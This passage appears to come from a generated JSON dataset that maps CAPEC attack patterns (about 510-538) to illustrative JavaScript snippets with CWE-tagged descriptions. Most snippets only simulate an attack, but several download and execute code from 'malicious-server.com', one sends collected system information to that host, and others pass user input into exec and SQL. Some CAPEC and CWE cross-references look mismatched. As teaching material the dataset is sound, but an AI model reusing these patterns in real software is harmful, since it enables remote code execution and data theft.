        "description": "This JavaScript code snippet simulates the Kerberoasting attack described in the CAPEC. It demonstrates how an attacker can exploit weak password practices (CWE-521) and insufficiently protected credentials (CWE-522) to obtain and brute-force a service ticket. The code first simulates obtaining a service ticket encrypted with RC4 using a weak password. It then saves this ticket to disk, representing the insecure storage of credentials. Finally, it attempts to brute-force the ticket using a list of weak passwords, highlighting the risks associated with single-factor authentication (CWE-308) and the use of password systems for primary authentication (CWE-309)."
    },
    {
        "capec_id": "510",
        "capec_name": "SaaS User Request Forgery",
        "code_snippet": "const maliciousApp = () => {\n  const trustedUserSession = getSessionFromLocalStorage(); // CWE-346: Origin Validation Error\n  if (trustedUserSession) {\n    fetch('https://saas-application.com/api/performAction', {\n      method: 'POST',\n      headers: {\n        'Authorization': `Bearer ${trustedUserSession.token}` // CWE-863, CWE-285: Incorrect/Improper Authorization\n      },\n      body: JSON.stringify({ action: 'maliciousAction' })\n    })\n    .then(response => response.json())\n    .then(data => console.log('Action performed:', data))\n    .catch(error => console.error('Error:', error));\n  } else {\n    console.error('No valid session found');\n  }\n};\n\nconst getSessionFromLocalStorage = () => {\n  // CWE-602: Client-Side Enforcement of Server-Side Security\n  return JSON.parse(localStorage.getItem('trustedUserSession'));\n};\n\nmaliciousApp();",
        "description": "This JavaScript code snippet demonstrates a SaaS User Request Forgery attack. The `maliciousApp` function attempts to retrieve a trusted user's session token from local storage (CWE-346: Origin Validation Error). If a valid session is found, it sends a POST request to a SaaS application's API endpoint using the trusted user's session token (CWE-863, CWE-285: Incorrect/Improper Authorization). The `getSessionFromLocalStorage` function simulates client-side enforcement of server-side security (CWE-602), which is inherently insecure. This code represents how an attacker can exploit the implicit trust placed on a user's session to perform unauthorized actions on a SaaS application."
    },
    {
        "capec_id": "511",
        "capec_name": "Infiltration of Software Development Environment",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-215: Insertion of Sensitive Information Into Debugging Code\nconst sensitiveInfo = 'API_KEY=12345';\nconsole.log(`Debug Info: ${sensitiveInfo}`);\n\n// CWE-434: Unrestricted Upload of File with Dangerous Type\nfunction uploadFile(file) {\n  const uploadPath = path.join(__dirname, 'uploads', file.name);\n  fs.writeFileSync(uploadPath, file.data);\n  console.log('File uploaded successfully');\n}\n\n// CWE-506: Embedded Malicious Code\nfunction executeMaliciousCode() {\n  console.log('Executing malicious code...');\n  // Malicious actions here\n}\n\n// CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nfunction getSystemInfo() {\n  return {\n    os: process.platform,\n    nodeVersion: process.version,\n    memoryUsage: process.memoryUsage()\n  };\n}\n\n// CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nfunction exposeSensitiveInfo() {\n  const systemInfo = getSystemInfo();\n  console.log(`System Info: ${JSON.stringify(systemInfo)}`);\n}\n\n// Simulate infiltration and malicious actions\nfunction infiltrateIDE() {\n  console.log('Infiltrating IDE...');\n  executeMaliciousCode();\n  exposeSensitiveInfo();\n}\n\n// Simulate file upload\nuploadFile({ name: 'malicious.exe', data: 'malicious content' });\n\n// Simulate IDE infiltration\ninfiltrateIDE();",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker infiltrates an IDE environment, leveraging several common weaknesses. The code includes: \n1. CWE-215: Sensitive information (API key) is inserted into debugging code, which is logged to the console.\n2. CWE-434: A function to upload files without restriction on file types, allowing dangerous files to be uploaded.\n3. CWE-506: A function that simulates the execution of malicious code.\n4. CWE-497: A function that retrieves and exposes sensitive system information.\n5. CWE-200: The sensitive system information is logged to the console, exposing it to unauthorized actors.\nThe `infiltrateIDE` function simulates the infiltration of the IDE, executing malicious code and exposing sensitive information, representing the main idea of the CAPEC."
    },
    {
        "capec_id": "516",
        "capec_name": "Hardware Component Substitution During Baselining",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Simulate loading a third-party hardware component\nfunction loadHardwareComponent(componentPath) {\n  if (!fs.existsSync(componentPath)) {\n    throw new Error('Component not found');\n  }\n  const component = require(componentPath);\n  if (!component.isTrusted) {\n    throw new Error('Untrusted component');\n  }\n  return component;\n}\n\n// Simulate baseline development\nfunction baselineDevelopment() {\n  const componentPath = path.join(__dirname, 'hardwareComponent.js');\n  try {\n    const component = loadHardwareComponent(componentPath);\n    // Simulate calibration with the component\n    component.calibrate();\n    console.log('Baseline development completed with trusted component');\n  } catch (error) {\n    console.error('Baseline development failed:', error.message);\n  }\n}\n\nbaselineDevelopment();",
        "description": "This JavaScript code snippet simulates the process of loading a hardware component during the baseline development phase. It checks for the existence of the component and verifies its trustworthiness before proceeding with calibration. This embodies the main idea of CAPEC- Hardware Component Substitution During Baselining, where an adversary could substitute a malicious component. The code also highlights related CWEs such as dependency on a vulnerable third-party component (CWE-1395), reliance on an insufficiently trustworthy component (CWE-1357), and the inability to update the component (CWE-1329). The `loadHardwareComponent` function ensures that only trusted components are used, representing a safeguard against such attacks."
    },
    {
        "capec_id": "517",
        "capec_name": "Documentation Alteration to Circumvent Dial-down",
        "code_snippet": "const fs = require('fs');\n\n// CWE-1263: Improper Physical Access Control\n// Simulating unauthorized access to documentation\nconst unauthorizedAccess = (filePath) => {\n  try {\n    // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n    let data = fs.readFileSync(filePath, 'utf8');\n    console.log('Sensitive Data:', data);\n\n    // CWE-1059: Insufficient Technical Documentation\n    if (!data.includes('critical component')) {\n      throw new Error('Insufficient documentation detected');\n    }\n\n    // CWE-695: Use of Low-Level Functionality\n    // Altering the documentation to circumvent dial-down functionality\n    let alteredData = data.replace('restricted', 'unrestricted');\n\n    // CWE-222: Truncation of Security-relevant Information\n    alteredData = alteredData.substring(0, 100); // Truncate to obscure changes\n\n    // Write the altered data back to the file\n    fs.writeFileSync(filePath, alteredData, 'utf8');\n    console.log('Documentation altered successfully');\n  } catch (err) {\n    console.error('Error:', err.message);\n  }\n};\n\n// Example usage\nunauthorizedAccess('path/to/documentation.txt');",
        "description": "This JavaScript code snippet simulates an attack where an unauthorized actor gains physical access to sensitive documentation (CWE-1263). The attacker reads the documentation, exposing sensitive information (CWE-200). If the documentation is insufficient (CWE-1059), an error is thrown. The attacker then alters the documentation to change 'restricted' to 'unrestricted', circumventing dial-down functionality (CWE-695). Finally, the altered data is truncated to obscure the changes (CWE-222) and written back to the file. This represents the CAPEC scenario where an attacker modifies documentation to bypass restrictions on advanced technology."
    },
    {
        "capec_id": "518",
        "capec_name": "Documentation Alteration to Produce Under-performing Systems",
        "code_snippet": "/* Insufficient Technical Documentation and Exposure of Sensitive System Information */\n\n// Function to initialize system with sensitive configuration\nfunction initializeSystem(config) {\n    // Missing documentation for design and insufficient technical documentation\n    // No clear description of what 'config' should contain\n    if (!config) {\n        throw new Error('Configuration is required');\n    }\n    // Use of low-level functionality\n    let systemState = lowLevelInit(config); // lowLevelInit is a hypothetical low-level function\n    return systemState;\n}\n\n// Function to handle user input\nfunction handleUserInput(input) {\n    // Improper following of specification by caller\n    if (typeof input !== 'string') {\n        throw new Error('Input must be a string');\n    }\n    // Exposure of sensitive system information\n    console.log('User input received:', input);\n    // Potentially sensitive information logged without proper sanitization\n}\n\n// Hypothetical low-level initialization function\nfunction lowLevelInit(config) {\n    // This function is not documented and uses low-level operations\n    // that are not supposed to be used as per the framework's guidelines\n    return { initialized: true, config: config };\n}\n\n// Example usage\ntry {\n    let config = { key: 'value' }; // Configuration details are vague\n    let system = initializeSystem(config);\n    handleUserInput('test input');\n} catch (error) {\n    console.error('Error:', error.message);\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker could exploit insufficient technical documentation and exposure of sensitive system information to cause system underperformance. The `initializeSystem` function lacks proper documentation and uses a low-level function `lowLevelInit`, which is not supposed to be used according to the framework's guidelines. The `handleUserInput` function improperly follows specifications by not sanitizing user input and logging potentially sensitive information. This code embodies the main idea of the CAPEC by showing how altering documentation and insufficient documentation can lead to system vulnerabilities."
    },
    {
        "capec_id": "519",
        "capec_name": "Documentation Alteration to Cause Errors in System Design",
        "code_snippet": "/* Documentation Alteration to Cause Errors in System Design */\n\n// Original documentation specifies a function to calculate the area of a rectangle\n// function calculateArea(length, width) {\n//     return length * width;\n// }\n\n// Malicious alteration in the documentation\n// function calculateArea(length, width) {\n//     return length + width; // Incorrect implementation\n// }\n\n// Implementation based on altered documentation\nfunction calculateArea(length, width) {\n    return length + width; // Incorrect implementation\n}\n\n// Usage of the function\nlet length = 5;\nlet width = 10;\nconsole.log('Area:', calculateArea(length, width)); // Outputs: Area: 15, which is incorrect",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker maliciously alters the documentation of a function that calculates the area of a rectangle. The original documentation correctly specifies the function to return the product of length and width. However, the attacker changes the documentation to specify an incorrect implementation that returns the sum of length and width instead. The code then implements the function based on the altered documentation, leading to incorrect functionality. This embodies the CAPEC idea of altering documentation to cause errors in system design. The related CWEs are represented by the insufficient and incorrect documentation (CWE-1059, CWE-1053), improper following of specifications (CWE-573), incorrect functionality (CWE-684), and improper control of dynamically-managed code resources (CWE-913)."
    },
    {
        "capec_id": "520",
        "capec_name": "Counterfeit Hardware Component Inserted During Product Assembly",
        "code_snippet": "class HardwareComponent {\n  constructor() {\n    this.trusted = false; // CWE-1357: Reliance on Insufficiently Trustworthy Component\n    this.maliciousCode = () => {\n      // CWE-506: Embedded Malicious Code\n      console.log('Executing malicious code');\n    };\n  }\n\n  execute() {\n    if (!this.trusted) {\n      this.maliciousCode();\n    }\n  }\n}\n\n// Simulating the insertion of a counterfeit hardware component\nconst counterfeitComponent = new HardwareComponent();\ncounterfeitComponent.execute();",
        "description": "This JavaScript code snippet simulates the insertion of a counterfeit hardware component during product assembly. The `HardwareComponent` class represents a hardware component with a `trusted` property set to `false`, indicating it is not a trustworthy component (CWE-1357). The class also contains a `maliciousCode` method that logs a message to the console, representing embedded malicious code (CWE-506). The `execute` method checks if the component is trusted and, if not, executes the malicious code. The instantiation and execution of the `counterfeitComponent` simulate the introduction and activation of a counterfeit hardware component in a system, embodying the main idea of the CAPEC."
    },
    {
        "capec_id": "521",
        "capec_name": "Hardware Design Specifications Are Altered",
        "code_snippet": "const hardwareSpecs = {\n  registerDefaults: {\n    secureRegister: 0x00, // CWE-1221: Incorrect Register Defaults\n    debugMode: false // CWE-1296: Incorrect Chaining or Granularity of Debug Components\n  },\n  lockBit: true // CWE-1231: Improper Prevention of Lock Bit Modification\n};\n\n// CWE-657: Violation of Secure Design Principles\nfunction alterHardwareSpecs(specs) {\n  // Attacker modifies the secure register default to an insecure value\n  specs.registerDefaults.secureRegister = 0xFF;\n  // Attacker enables debug mode\n  specs.registerDefaults.debugMode = true;\n  // Attacker modifies the lock bit\n  specs.lockBit = false;\n}\n\n// Simulate an attacker altering the hardware specifications\nalterHardwareSpecs(hardwareSpecs);\n\nconsole.log(hardwareSpecs);",
        "description": "This JavaScript code snippet simulates an attacker altering hardware design specifications, embodying the main idea of the CAPEC 'Hardware Design Specifications Are Altered'. The code defines an object 'hardwareSpecs' with initial secure values for register defaults and a lock bit. The 'alterHardwareSpecs' function represents an attacker's actions by changing these values to insecure ones, demonstrating CWE-1221 (Incorrect Register Defaults), CWE-1296 (Incorrect Chaining or Granularity of Debug Components), and CWE-1231 (Improper Prevention of Lock Bit Modification). The function also violates secure design principles (CWE-657) by making these insecure modifications. The final console log shows the altered hardware specifications, highlighting the potential vulnerabilities introduced by such an attack."
    },
    {
        "capec_id": "522",
        "capec_name": "Malicious Hardware Component Replacement",
        "code_snippet": "class HardwareComponent {\n  constructor(name, version) {\n    this.name = name;\n    this.version = version;\n    this.isTrusted = false; // CWE-1357: Insufficiently Trustworthy Component\n  }\n\n  updateFirmware() {\n    if (!this.isTrusted) {\n      console.log('Firmware update failed: Component is not trusted.'); // CWE-1329: Not Updateable\n      return;\n    }\n    console.log('Firmware updated successfully.');\n  }\n\n  injectError() {\n    console.log('Error injected into hardware component.'); // CWE-1334: Unauthorized Error Injection\n  }\n}\n\nclass System {\n  constructor() {\n    this.components = [];\n  }\n\n  addComponent(component) {\n    if (component.name === 'maliciousComponent') {\n      console.log('Warning: Malicious component detected!'); // CWE-506: Embedded Malicious Code\n    }\n    this.components.push(component);\n  }\n\n  checkDependencies() {\n    this.components.forEach(component => {\n      if (component.name === 'vulnerableThirdParty') {\n        console.log('Warning: Dependency on vulnerable third-party component detected!'); // CWE-1395: Vulnerable Third-Party Component\n      }\n    });\n  }\n}\n\n// Example usage\nconst system = new System();\nconst maliciousComponent = new HardwareComponent('maliciousComponent', '1.0');\nconst vulnerableComponent = new HardwareComponent('vulnerableThirdParty', '2.0');\n\nsystem.addComponent(maliciousComponent);\nsystem.addComponent(vulnerableComponent);\nsystem.checkDependencies();\nmaliciousComponent.injectError();\nvulnerableComponent.updateFirmware();",
        "description": "This JavaScript code snippet represents a system where hardware components can be added and managed. The `HardwareComponent` class includes properties and methods that reflect vulnerabilities such as being untrustworthy (CWE-1357), not updateable (CWE-1329), and susceptible to error injection (CWE-1334). The `System` class manages these components and checks for malicious (CWE-506) and vulnerable third-party components (CWE-1395). The code demonstrates how an adversary could exploit these weaknesses by adding malicious or vulnerable components to the system, leading to potential security risks."
    },
    {
        "capec_id": "523",
        "capec_name": "Malicious Software Implanted",
        "code_snippet": "const fs = require('fs');\nconst http = require('http');\n\n// CWE-1395: Dependency on Vulnerable Third-Party Component\nconst vulnerableLib = require('vulnerable-lib');\n\n// CWE-506: Embedded Malicious Code\nfunction maliciousFunction() {\n  // CWE-509: Replicating Malicious Code (Virus or Worm)\n  http.get('http://malicious-server.com/payload', (res) => {\n    res.on('data', (chunk) => {\n      fs.writeFileSync('/tmp/malicious_payload', chunk);\n      require('/tmp/malicious_payload');\n    });\n  });\n}\n\n// CWE-1229: Creation of Emergent Resource\nfunction createEmergentResource() {\n  fs.writeFileSync('/tmp/emergent_resource', 'This is an emergent resource.');\n}\n\n// CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\nfunction injectErrors() {\n  throw new Error('Injected error to degrade system redundancy');\n}\n\n// Main function to simulate the malicious software implantation\nfunction main() {\n  if (vulnerableLib.isVulnerable()) {\n    maliciousFunction();\n    createEmergentResource();\n    injectErrors();\n  }\n}\n\nmain();",
        "description": "This JavaScript code snippet demonstrates the concept of 'Malicious Software Implanted' in a supply chain distribution channel. It uses a vulnerable third-party library (CWE-1395) to check if the system is vulnerable. If it is, it executes a series of malicious actions: downloading and executing a payload from a malicious server (CWE-506 and CWE-509), creating an emergent resource (CWE-1229), and injecting errors to degrade system redundancy (CWE-1334). This code embodies the idea of implanting malicious software to cause disruption or enable further compromise when the system is deployed."
    },
    {
        "capec_id": "524",
        "capec_name": "Rogue Integration Procedures",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst bodyParser = require('body-parser');\nconst { exec } = require('child_process');\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nconst maliciousLibrary = require('malicious-library');\n\napp.post('/execute', (req, res) => {\n  const userInput = req.body.command;\n\n  // CWE-89: SQL Injection vulnerability\n  const sqlQuery = `SELECT * FROM users WHERE name = '${userInput}'`;\n  database.query(sqlQuery, (err, result) => {\n    if (err) throw err;\n    res.send(result);\n  });\n\n  // CWE-506: Embedded Malicious Code\n  maliciousLibrary.executeMaliciousFunction();\n\n  // CWE-707: Improper Neutralization\n  exec(userInput, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    res.send(`stdout: ${stdout}`);\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a web server using the Express framework that embodies the main idea of the CAPEC 'Rogue Integration Procedures'. The code includes several vulnerabilities: \n1. CWE-829: The code imports a malicious library from an untrusted source.\n2. CWE-89: The code constructs an SQL query using user input without proper sanitization, leading to SQL Injection.\n3. CWE-506: The code executes a function from the malicious library, representing embedded malicious code.\n4. CWE-707: The code executes a shell command using user input without proper neutralization, leading to potential command injection.\nThis snippet demonstrates how an attacker could alter or establish rogue processes to insert malicious components into a system, leading to further compromise when the system is deployed."
    },
    {
        "capec_id": "528",
        "capec_name": "XML Flood",
        "code_snippet": "const http = require('http');\nconst xml2js = require('xml2js');\n\nconst server = http.createServer((req, res) => {\n  if (req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString();\n    });\n    req.on('end', () => {\n      xml2js.parseString(body, (err, result) => {\n        if (err) {\n          res.writeHead(400, {'Content-Type': 'text/plain'});\n          res.end('Invalid XML');\n        } else {\n          res.writeHead(200, {'Content-Type': 'text/plain'});\n          res.end('XML Received');\n        }\n      });\n    });\n  } else {\n    res.writeHead(405, {'Content-Type': 'text/plain'});\n    res.end('Method Not Allowed');\n  }\n});\n\nserver.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js that listens for POST requests containing XML data. When a POST request is received, the server reads the XML data and attempts to parse it using the 'xml2js' library. If the XML is invalid, it responds with a 400 status code and an 'Invalid XML' message. If the XML is valid, it responds with a 200 status code and an 'XML Received' message. This code is vulnerable to an XML Flood attack (CAPEC-230) because it does not impose any limits on the size or number of XML requests it can handle (CWE-770). Additionally, it does not validate the XML against a schema (CWE-112), making it susceptible to malformed or malicious XML content. The lack of proper XML validation and resource allocation controls can lead to a Denial of Service (DoS) condition, where the server becomes unstable, freezes, or crashes."
    },
    {
        "capec_id": "529",
        "capec_name": "Malware-Directed Internal Reconnaissance",
        "code_snippet": "const http = require('http');\nconst os = require('os');\nconst fs = require('fs');\n\n// Function to gather system information\nfunction gatherSystemInfo() {\n  const systemInfo = {\n    hostname: os.hostname(),\n    platform: os.platform(),\n    arch: os.arch(),\n    cpus: os.cpus(),\n    networkInterfaces: os.networkInterfaces()\n  };\n  return systemInfo;\n}\n\n// Function to send gathered information to an external server\nfunction sendInfoToServer(info) {\n  const options = {\n    hostname: 'malicious-server.com',\n    port: 80,\n    path: '/collect-info',\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json'\n    }\n  };\n\n  const req = http.request(options, (res) => {\n    res.on('data', (d) => {\n      process.stdout.write(d);\n    });\n  });\n\n  req.on('error', (e) => {\n    console.error(`Problem with request: ${e.message}`);\n  });\n\n  req.write(JSON.stringify(info));\n  req.end();\n}\n\n// Main function to execute the reconnaissance\nfunction main() {\n  const info = gatherSystemInfo();\n  sendInfoToServer(info);\n}\n\n// Execute the main function\nmain();",
        "description": "This JavaScript code snippet demonstrates a basic example of malware-directed internal reconnaissance. The code gathers sensitive system information such as hostname, platform, architecture, CPU details, and network interfaces using the 'os' module. It then sends this information to an external server ('malicious-server.com') using an HTTP POST request. This embodies the CAPEC concept of using malware to gather and exfiltrate information about a system's configuration and security mechanisms. The code also touches on related CWEs, such as the exposure of sensitive system information (CWE-497), embedded malicious code (CWE-506), and spyware behavior (CWE-512)."
    },
    {
        "capec_id": "530",
        "capec_name": "Provide Counterfeit Component",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Simulate the use of a third-party component\nconst thirdPartyComponentPath = path.join(__dirname, 'thirdPartyComponent.js');\n\n// Check if the third-party component exists\nif (fs.existsSync(thirdPartyComponentPath)) {\n  // Load the third-party component\n  const thirdPartyComponent = require(thirdPartyComponentPath);\n  \n  // Simulate the use of a function from the third-party component\n  thirdPartyComponent.performCriticalOperation();\n} else {\n  console.error('Critical third-party component is missing!');\n}\n\n// Simulate a function that could be malicious\nfunction performCriticalOperation() {\n  // Malicious code embedded here\n  console.log('Performing critical operation...');\n  // Simulate unauthorized access\n  console.log('Unauthorized access granted!');\n}\n\nmodule.exports = { performCriticalOperation };",
        "description": "This JavaScript code snippet demonstrates the concept of 'Provide Counterfeit Component' by simulating the use of a third-party component that could be counterfeit or malicious. The code checks for the existence of a third-party component and loads it if available. The third-party component contains a function 'performCriticalOperation' that simulates a critical operation but also includes malicious behavior, such as unauthorized access. This represents the CAPEC idea of an attacker providing a counterfeit component that is then integrated into the system, leading to potential disruption or compromise. The related CWEs are illustrated by the dependency on a potentially vulnerable or untrustworthy third-party component and the presence of embedded malicious code."
    },
    {
        "capec_id": "531",
        "capec_name": "Hardware Component Substitution",
        "code_snippet": "class HardwareComponent {\n  constructor(name, version) {\n    this.name = name;\n    this.version = version;\n    this.isMalicious = false;\n  }\n\n  updateFirmware(newVersion) {\n    if (this.isMalicious) {\n      console.log('Firmware update blocked: Malicious component detected.');\n      return;\n    }\n    this.version = newVersion;\n    console.log(`Firmware updated to version ${newVersion}`);\n  }\n\n  injectMaliciousCode() {\n    this.isMalicious = true;\n    console.log('Malicious code injected into hardware component.');\n  }\n}\n\n// Simulate hardware component substitution\nlet originalComponent = new HardwareComponent('ComponentA', '1.0');\nlet maliciousComponent = new HardwareComponent('ComponentA', '1.0');\nmaliciousComponent.injectMaliciousCode();\n\n// Attempt to update firmware on the malicious component\nmaliciousComponent.updateFirmware('2.0');",
        "description": "This JavaScript code snippet simulates the substitution of a hardware component with a maliciously altered one, embodying the main idea of the CAPEC 'Hardware Component Substitution'. The `HardwareComponent` class represents a hardware component with methods to update firmware and inject malicious code. The `injectMaliciousCode` method marks the component as malicious, and the `updateFirmware` method checks for this flag before allowing a firmware update, representing CWE-1329 (Reliance on Component That is Not Updateable) and CWE-506 (Embedded Malicious Code). The simulation shows how a malicious component can block legitimate updates, highlighting the risks of hardware component substitution."
    },
    {
        "capec_id": "532",
        "capec_name": "Altered Installed BIOS",
        "code_snippet": "const fs = require('fs');\n\n// Simulate downloading a malicious BIOS update\nfunction downloadMaliciousBIOS() {\n  return 'malicious_bios.bin';\n}\n\n// Simulate updating the BIOS with the downloaded file\nfunction updateBIOS(biosFile) {\n  if (!fs.existsSync(biosFile)) {\n    console.error('BIOS file does not exist.');\n    return;\n  }\n  // Simulate insufficient access control by allowing any user to update the BIOS\n  console.log('Updating BIOS with', biosFile);\n  // Simulate embedded malicious code\n  fs.writeFileSync('/system/firmware/bios.bin', fs.readFileSync(biosFile));\n  console.log('BIOS update complete.');\n}\n\n// Main function to execute the attack\nfunction main() {\n  const biosFile = downloadMaliciousBIOS();\n  updateBIOS(biosFile);\n}\n\nmain();",
        "description": "This JavaScript code snippet simulates the process of downloading and updating a BIOS with a malicious file, embodying the main idea of the CAPEC 'Altered Installed BIOS'. The `downloadMaliciousBIOS` function represents the attacker downloading a malicious BIOS file. The `updateBIOS` function simulates the process of updating the BIOS with this file, demonstrating insufficient access control (CWE-1220) by allowing any user to perform the update. The code also simulates the presence of embedded malicious code (CWE-506) by writing the malicious BIOS file to the system firmware directory. This snippet highlights the vulnerabilities associated with improper BIOS update mechanisms and the potential for exploitation."
    },
    {
        "capec_id": "533",
        "capec_name": "Malicious Manual Software Update",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\n// CWE-494: Download of Code Without Integrity Check\nhttp.get('http://malicious-site.com/update', (res) => {\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => {\n    // CWE-506: Embedded Malicious Code\n    fs.writeFile('update.js', data, (err) => {\n      if (err) throw err;\n      console.log('Update downloaded and saved.');\n      // Execute the downloaded update without integrity check\n      require('./update.js');\n    });\n  });\n}).on('error', (err) => {\n  console.error('Error downloading update:', err.message);\n});\n\n// CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nconst sensitiveInfo = 'Sensitive System Information';\nconsole.log('Sensitive Info:', sensitiveInfo);",
        "description": "This JavaScript code snippet demonstrates a vulnerable software update mechanism. It downloads an update from a remote location without verifying its integrity (CWE-494). The downloaded code is then saved and executed, potentially containing embedded malicious code (CWE-506). Additionally, the code logs sensitive system information to the console, exposing it to unauthorized actors (CWE-497). This snippet embodies the main idea of the CAPEC by showing how an attacker can introduce malicious code through a software update, leading to further compromise of the system."
    },
    {
        "capec_id": "534",
        "capec_name": "Malicious Hardware Update",
        "code_snippet": "class HardwareComponent {\n  constructor() {\n    this.firmwareVersion = '1.0.0';\n    this.isUpdateable = false; // CWE-1277: Firmware Not Updateable\n  }\n\n  replaceComponent(newComponent) {\n    if (newComponent.isMalicious) { // CWE-506: Embedded Malicious Code\n      console.log('Warning: Malicious component detected!');\n      return;\n    }\n    this.firmwareVersion = newComponent.firmwareVersion;\n    this.isUpdateable = newComponent.isUpdateable;\n    console.log('Component replaced successfully.');\n  }\n}\n\n// Simulating a malicious hardware update\nconst originalComponent = new HardwareComponent();\nconst maliciousComponent = {\n  firmwareVersion: '2.0.0',\n  isUpdateable: false,\n  isMalicious: true // CWE-506: Embedded Malicious Code\n};\n\noriginalComponent.replaceComponent(maliciousComponent);",
        "description": "This JavaScript code snippet represents a simplified model of a hardware component that can be replaced or updated. The `HardwareComponent` class has a firmware version and a flag indicating whether it is updateable (CWE-1277). The `replaceComponent` method checks if the new component is malicious (CWE-506) before replacing the existing component. If a malicious component is detected, a warning is logged, and the replacement is aborted. This snippet embodies the main idea of CAPEC-460, where an adversary introduces malicious hardware during an update or replacement procedure, potentially compromising the system."
    },
    {
        "capec_id": "535",
        "capec_name": "Malicious Gray Market Hardware",
        "code_snippet": "class MaliciousHardware {\n  constructor() {\n    this.firmware = this.loadMaliciousFirmware(); // CWE-506: Embedded Malicious Code\n    this.updateable = false; // CWE-1329: Reliance on Component That is Not Updateable\n  }\n\n  loadMaliciousFirmware() {\n    // Simulate loading malicious firmware\n    return 'malicious_firmware_code';\n  }\n\n  useVulnerableComponent() {\n    // CWE-1395: Dependency on Vulnerable Third-Party Component\n    const vulnerableComponent = require('vulnerable-component');\n    vulnerableComponent.execute();\n  }\n\n  accessConfidentialInfo() {\n    // CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\n    const confidentialInfo = this.getConfidentialInfo();\n    console.log(confidentialInfo); // Simulate unauthorized access\n  }\n\n  getConfidentialInfo() {\n    return 'confidential_data';\n  }\n}\n\n// Simulate the use of malicious hardware\nconst hardware = new MaliciousHardware();\nhardware.useVulnerableComponent();\nhardware.accessConfidentialInfo();",
        "description": "This JavaScript code snippet represents a malicious hardware component that embodies the main idea of the CAPEC 'Malicious Gray Market Hardware'. The class 'MaliciousHardware' includes several vulnerabilities: it loads malicious firmware (CWE-506), is not updateable (CWE-1329), uses a vulnerable third-party component (CWE-1395), and allows unauthorized access to confidential information (CWE-1297). The code simulates the behavior of such compromised hardware, highlighting the potential risks and security issues associated with gray market hardware components."
    },
    {
        "capec_id": "536",
        "capec_name": "Data Injected During Configuration",
        "code_snippet": "const fs = require('fs');\nconst configFilePath = '/etc/app/config.json';\n\n// CWE-284: Improper Access Control\nif (fs.existsSync(configFilePath)) {\n  let configData = fs.readFileSync(configFilePath, 'utf8');\n  try {\n    let config = JSON.parse(configData);\n    // CWE-99: Improper Control of Resource Identifiers\n    let resourcePath = config.resourcePath;\n    // CWE-377: Insecure Temporary File\n    let tempFilePath = `/tmp/${resourcePath}.tmp`;\n    fs.writeFileSync(tempFilePath, 'Temporary data');\n    console.log('Configuration and temporary file created.');\n  } catch (e) {\n    console.error('Failed to parse configuration file.');\n  }\n} else {\n  console.error('Configuration file does not exist.');\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker could inject malicious data into a configuration file, leading to suboptimal system performance. The code reads a configuration file (CWE-284: Improper Access Control) and parses it. It then uses a value from the configuration file to create a temporary file (CWE-99: Improper Control of Resource Identifiers and CWE-377: Insecure Temporary File). If an attacker can modify the configuration file, they could inject a malicious resource path, causing the system to create or overwrite critical files, leading to potential system compromise. This embodies the CAPEC idea of injecting malicious data during configuration to alter system behavior."
    },
    {
        "capec_id": "537",
        "capec_name": "Infiltration of Hardware Development Environment",
        "code_snippet": "const fs = require('fs');\n\n// CWE-506: Embedded Malicious Code\nfunction injectMaliciousCode(filePath) {\n  const maliciousCode = `\n    // Malicious code injected\n    console.log('Sensitive data exfiltrated');\n    // CWE-497: Exposure of Sensitive System Information\n    const sensitiveData = fs.readFileSync('/path/to/sensitive/data.txt', 'utf8');\n    console.log(sensitiveData);\n  `;\n\n  // CWE-1297: Unprotected Confidential Information on Device\n  fs.appendFileSync(filePath, maliciousCode);\n}\n\n// CWE-1329: Reliance on Component That is Not Updateable\nfunction deployToNonUpdateableComponent() {\n  const firmwarePath = '/path/to/firmware.bin';\n  injectMaliciousCode(firmwarePath);\n}\n\ndeployToNonUpdateableComponent();",
        "description": "This JavaScript code snippet demonstrates the infiltration of a hardware development environment by injecting malicious code into a firmware file. The `injectMaliciousCode` function appends a piece of malicious code to a specified file, which reads and logs sensitive data from a protected path (CWE-506 and CWE-497). The `deployToNonUpdateableComponent` function simulates deploying this modified firmware to a component that cannot be updated (CWE-1329). This represents the CAPEC scenario where an adversary manipulates the development environment to compromise hardware components, potentially leading to the exposure of sensitive information and further system compromise."
    },
    {
        "capec_id": "538",
        "capec_name": "Open-Source Library Manipulation",
        "code_snippet": "const https = require('https');\nconst fs = require('fs');\n\n// CWE-494: Download of Code Without Integrity Check\nhttps.get('https://example.com/malicious-library.js', (res) => {\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => {\n    // CWE-506: Embedded Malicious Code\n    fs.writeFileSync('malicious-library.js', data);\n    require('./malicious-library.js'); // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n  });\n}).on('error', (err) => {\n  console.error('Error downloading the library:', err);\n});",
